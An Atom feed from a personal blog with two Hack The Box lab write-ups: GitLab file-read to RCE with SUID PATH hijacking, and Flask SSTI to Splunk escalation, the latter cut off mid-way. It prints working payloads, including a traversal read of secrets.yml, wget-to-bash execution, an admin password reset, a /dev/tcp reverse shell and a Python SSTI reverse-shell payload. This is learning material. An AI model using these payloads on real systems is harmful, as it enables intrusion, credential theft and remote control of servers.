<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-04-18T22:25:34+02:00</updated><id>/feed.xml</id><title type="html">The Cyber Experiment</title><subtitle>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</subtitle><entry><title type="html">Laboratory Write-Up</title><link href="/htb/laboratory" rel="alternate" type="text/html" title="Laboratory Write-Up" /><published>2021-04-16T23:44:00+02:00</published><updated>2021-04-16T23:44:00+02:00</updated><id>/htb/laboratory</id><content type="html" xml:base="/htb/laboratory">&lt;p&gt;This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.216 &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/laboratory
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;kali: 
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-04-16 16:42 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.216
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.022s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: The Laboratory
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;webapplication-enumeration&quot;&gt;Webapplication Enumeration&lt;/h2&gt;
&lt;p&gt;Port 80 redirects to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;laboratory.htb&lt;/code&gt; so lets add that to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. Firefox present a certificate error indicating that the certificate is only valid for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb&lt;/code&gt;, so lets add it to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/laboratory/gitlab-subdomain-cert-error.png&quot; alt=&quot;certificate error&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I can create an account on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb&lt;/code&gt; by using an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@laboratory.htb&lt;/code&gt; email address. Once logged in I determine the version of GitLab by going to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb/help&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/laboratory/gitlab-version.png&quot; alt=&quot;gitlab-version&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Googling GitLab 12.8.1 I can find an interesting vulnerability. It is an arbitrary file read vulnerabilty (&lt;a href=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/212175&quot;&gt;gitlab issue&lt;/a&gt;) that can be levereged to get RCE through a deserialization attack.&lt;/p&gt;

&lt;p&gt;As a learning exercise I decided to perform the LFI manually.&lt;/p&gt;

&lt;h2 id=&quot;gitlab-arbitrary-file-read&quot;&gt;Gitlab Arbitrary File Read&lt;/h2&gt;
&lt;p&gt;To do this manually I login into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb&lt;/code&gt; and perform the following steps:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Create a new project named p1&lt;/li&gt;
  &lt;li&gt;Create a new project named p2&lt;/li&gt;
  &lt;li&gt;Create in p1 a new issue with the description: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Move the issue from p1 to p2 (Button in lower right corner)&lt;/li&gt;
  &lt;li&gt;Visit the issue in p2 to download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets.yml&lt;/code&gt; file&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets.yml&lt;/code&gt; file I extract the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key_base&lt;/code&gt; key&lt;/p&gt;

&lt;h2 id=&quot;gitlab-rce&quot;&gt;Gitlab RCE&lt;/h2&gt;
&lt;p&gt;To obtain code execution I configure the metasploit module and provide it the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret-key_base&lt;/code&gt; so it will not perform the LFI (that did not work for me). I show the used settings in the image below. I then use the resulting shell to spawn another reverseshell that I can &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;upgrade using some python magic&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/laboratory/gitlab-rce-msf.png&quot; alt=&quot;msfconsole gitlab rce&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;gitlab-container-enumeration&quot;&gt;GitLab Container Enumeration&lt;/h2&gt;
&lt;p&gt;In the reverse shell I run Linpeas.sh (without touching disk): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget http://10.10.15.46:8000/linpeas.sh -O - | /bin/bash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;From the output I discover that I am currently inside a docker container. Linpeas also dumps user credentials of the GitLab application. From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; script I extract the following command to change the password of the root user:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitlab-rails runner 'user = User.find_by(email: &quot;admin@example.com&quot;); user.password = &quot;pass_peass_pass&quot;; user.password_confirmation = &quot;pass_peass_pass&quot;; user.save!'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Reflection: In hindsight it would have been better opsec to have given admin privileges to my own account instead of changing the admin’s passwords. This would probably require using the gitlib console.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-shell&quot;&gt;User Shell&lt;/h2&gt;
&lt;p&gt;Next, I log in using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@example.com:pass_peass_pass&lt;/code&gt; credentials. As admin I can now see 2 more projects. Inside the secure docker project I find a SSH private key. Gitlab also shows that the username of the admin account is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dexter&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/laboratory/gitlab-dexter-sshkey.png&quot; alt=&quot;dexter ssh key&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, I log into the machine via SSH using the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dexter&lt;/code&gt; and the found SSH key:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh dexter@laboratory.htb -i id_rsa_dexter&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;And then start enumerating again using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt;, in the output was one interesting SUID file that I did not recognize: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/docker-security&lt;/code&gt;. Googling the file I could not find anything about it, also running the file gave no output. Next I tried running it with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h&lt;/code&gt; flags hoping it would give some output that would reveal what the file did. However, no success here.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Next I tried ltracing to file to figure out what it does. The ltrace output shows that the binary calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; program, without specifying the full path. This is a security risk, as the binary runs as root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ltrace /usr/local/bin/docker-security             
setuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
setgid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;chmod 700 /usr/bin/docker&quot;&lt;/span&gt; &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;chmod 660 /var/run/docker.sock&quot;&lt;/span&gt; &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I know the use of relative paths can be levereged to get code execution, whowever it has been a while since I last did this. So I used &lt;a href=&quot;https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e&quot;&gt;this blogpost&lt;/a&gt; as a reference and get code execution by creating a fake &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; file containing a reverse shell and then adding it to my path.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
dexter@laboratory:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./chmod 
dexter@laboratory:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker-security
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Abusing the docker-security binary that uses relative paths.&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
/bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.46/4243 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Contents of the fake chmod file.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I read out the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; flag using the resulting reverse shell.&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.</summary></entry><entry><title type="html">Doctor Write-Up</title><link href="/htb/doctor-write-up" rel="alternate" type="text/html" title="Doctor Write-Up" /><published>2021-03-26T22:36:00+01:00</published><updated>2021-03-26T22:36:00+01:00</updated><id>/htb/doctor-write-up</id><content type="html" xml:base="/htb/doctor-write-up">&lt;p&gt;This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user.&lt;/p&gt;

&lt;h2 id=&quot;scanning--enumeration&quot;&gt;Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;Initial nmap scan of the machine shows Apache running on port 80 and Splunk running on port 8089. As I am not familiar with Splunk; I googled it first. Initial results show that Splunk Forwarder provides functionality for code execution (&lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence&quot;&gt;hacktrickz post&lt;/a&gt;). However, to use this we first need a set of valid credentials. So lets first have a look at the web application.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.209 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.209&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.025s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
not shown: 997 filtered ports

port     state service  version
22/tcp   open  ssh      openssh 8.2p1 ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ubuntu linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ecdsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ed25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http     apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: doctor
8089/tcp open  ssl/http splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: splunkd
|_http-title: splunkd
| ssl-cert: subject: &lt;span class=&quot;nv&quot;&gt;commonname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;splunkserverdefaultcert/organizationname&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;splunkuser
| not valid before: 2020-09-06t15:57:27
|_not valid after:  2023-09-06t15:57:27
service info: os: linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; cpe: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;enumerating-the-web-application&quot;&gt;Enumerating the Web Application&lt;/h2&gt;
&lt;p&gt;The web page does not seem to contain anything interesting other than an email address revealing the hostname of the machine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info@docters.htb&lt;/code&gt;. I add an entry to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file and visit the web page by going directly to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doctors.htb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This time the web application shows a Secure messaging app. I first create an account and then test the New Mesage functionality for XSS. 
&lt;img src=&quot;/assets/htb/doctor/xss.png&quot; alt=&quot;Failed XSS attempt&quot; /&gt;
&lt;em&gt;XSS failed as the input is sanitized by the web application.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Next, I analyzed the source code of the web page adn find an interesting comment that links to a ‘hidden’ web page that is apparently still under beta testing. Visiting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/archive&lt;/code&gt; page, I don’t see anything but the source of the web page is actually an XML file contains the titles of all messages. On this page my XSS payload is not escaped, but as it is an XML page and not an HTML page the payload also is not being executed.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar-nav mr-auto&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-item nav-link&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/home&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--archive still under beta testing&amp;lt;a class=&quot;nav-item nav-link&quot; href=&quot;/archive&quot;&amp;gt;Archive&amp;lt;/a&amp;gt;--&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;server-side-template-injection&quot;&gt;Server Side Template Injection&lt;/h2&gt;

&lt;p&gt;I got stuck here and decided to browse the internet for web application attacks. On the Port Swigger website I found an &lt;a href=&quot;SSTI&quot;&gt;interesting post&lt;/a&gt; about Server Side Template Injection (SSTI) which seemed like a plausible option here. So I followed the methodology for identifying SSTI vulnerabilities and created a message with the title &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{{7*7}}&lt;/code&gt; which was rendered as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;49&lt;/code&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/archive&lt;/code&gt; page does confirming the SSTI vulnerabilty.&lt;/p&gt;

&lt;p&gt;The SSTI vulnerability allows the execution of python code in context of the web application. In other words, I exploit the SSTI to get a reverse shell using the payload below. I catch the reverse shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nlvp 9001&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__builtins__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;__import__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'os'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;&amp;lt;YOUR_IP_HERE&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;]);'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;SSTI payload for executing a reverse shell.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;post-exploitation&quot;&gt;Post Exploitation&lt;/h2&gt;
&lt;p&gt;The reverse shell is running as the web user. The web user cannot read the flag in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/shaun/user.txt&lt;/code&gt;. So I start further enumeration by running &lt;a href=&quot;linpeas&quot;&gt;linpeas.sh&lt;/a&gt; on the machine and discover that the web user is part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adm&lt;/code&gt; group. This is interesting for privilege escalation as the adm group is typically able to read logs, which may contain all kinds of interesting information (so I learned from &lt;a href=&quot;adm-group&quot;&gt;hacktrickz&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Reading the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/logs/apache2/backup&lt;/code&gt; log file we find a clear text credential: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Guitar123&lt;/code&gt; that was accidentally entered somewhere in a GET parameter. Using this credential I could log in as the Shaun user by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su shaun&lt;/code&gt; and retrieve the user flag.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;At this point, I have a set of valid credentials. Looking back to my notes I see that it might now be a good time to look into privilege escalation by abusing the Splunk Forwarder. I confirm that the credentials for Shaun also work for the Splunk Forwarder by testing them on: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.209:8089/services&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Checking back on the machine I confirm that the Splunk forwarder is running as the root user.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shaun@doctor:/home/web&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps aux | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;splunk
root        1135  0.1  2.2 265920 91672 ?        Sl   Feb05   0:49 splunkd &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8089 start
root        1137  0.0  0.3  77664 15476 ?        Ss   Feb05   0:00 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;splunkd &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1135] splunkd &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8089 start &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;process-runner]
